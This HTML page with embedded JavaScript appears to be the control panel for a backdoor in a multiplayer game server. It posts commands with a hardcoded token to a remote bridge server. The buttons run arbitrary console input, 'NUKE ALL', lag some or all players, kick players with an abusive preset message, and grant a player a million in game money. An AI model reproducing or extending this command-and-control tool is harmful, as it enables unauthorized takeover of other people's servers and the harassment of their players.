<!DOCTYPE html>
<html>
<head>
<style>
body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
h1 { color: #fff; }
button { background: #333; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; cursor: pointer; }
button:hover { background: #0f0; color: #000; }
input { background: #000; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
#log { background: #000; border: 1px solid #333; height: 200px; overflow-y: scroll; padding: 10px; margin-top: 20px; }
.group { margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
</style>
</head>
<body>
<h1>GHOST CONSOLE v3</h1>
<div id="status">System Status: INITIALIZING...</div>

<div class="group">
  <h3>Console Execution</h3>
  <input id="consoleInput" placeholder="e.g. list_resources">
  <button onclick="execAction('console')">EXECUTE</button>
  <button onclick="execAction('nuke')">NUKE ALL</button>
</div>

<div class="group">
  <h3>Lag Switch</h3>
  <input id="lagDur" type="number" value="5">
  <button onclick="execAction('lag')">LAG SINGLE (ID above?) NO - LAG SELF?</button>
  <!-- Note: Current bridge logic for 'lag' targets the poller who sent it? 
       Actually, in our architecture, 'lag' targets the specific client that polled.
       So if you want to lag a specific player, you'd need to route it differently.
       For now, 'lag' lags the first client that polls. -->
  <button onclick="execAction('lagAll')">LAG ALL PLAYERS</button>
</div>

<div class="group">
  <h3>Kick Player</h3>
  <input id="kickId" placeholder="Player ID (e.g., 5)" type="number">
  <input id="kickMsg" placeholder="Reason" value="Suck my Nuts Bitch">
  <button onclick="execAction('kick')">EXECUTE KICK</button>
</div>

<div class="group">
  <h3>Give Money</h3>
  <input id="moneyId" placeholder="Player ID" type="number">
  <input id="moneyAmt" placeholder="Amount" type="number" value="1000000">
  <button onclick="execAction('money')">EXECUTE PAYMENT</button>
</div>

<div id="log"></div>

<script>
const BRIDGE_URL = 'https://ghost-bridge-5626.onrender.com';
const TOKEN = 'GHOST_2025';

function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `[${time}] ${msg}<br>`;
    el.scrollTop = el.scrollHeight;
}

function execAction(action) {
    let body = { action: action };

    if (action === 'console') {
        body.input = document.getElementById('consoleInput').value;
    } else if (action === 'kick') {
        body.targetId = parseInt(document.getElementById('kickId').value);
        body.kickMsg = document.getElementById('kickMsg').value;
    } else if (action === 'money') {
        body.targetId = parseInt(document.getElementById('moneyId').value);
        body.amount = parseInt(document.getElementById('moneyAmt').value);
    } else if (action === 'lag') {
        body.duration = parseInt(document.getElementById('lagDur').value);
    }

    fetch(`${BRIDGE_URL}/api/exec`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Ghost-Token': TOKEN },
        body: JSON.stringify(body)
    }).then(r => r.json()).then(d => {
        log(`SUCCESS: ${JSON.stringify(d)}`);
    }).catch(e => log(`ERROR: ${e.message}`));
}

// Poll status
setInterval(() => {
    fetch(`${BRIDGE_URL}/api/stats`, {
        headers: { 'X-Ghost-Token': TOKEN }
    }).then(r => r.json()).then(d => {
        document.getElementById('status').innerText = `System Status: LINK ACTIVE | Players: ${d.players || 'Unknown'}`;
    });
}, 3000);
</script>
</body>
</html>
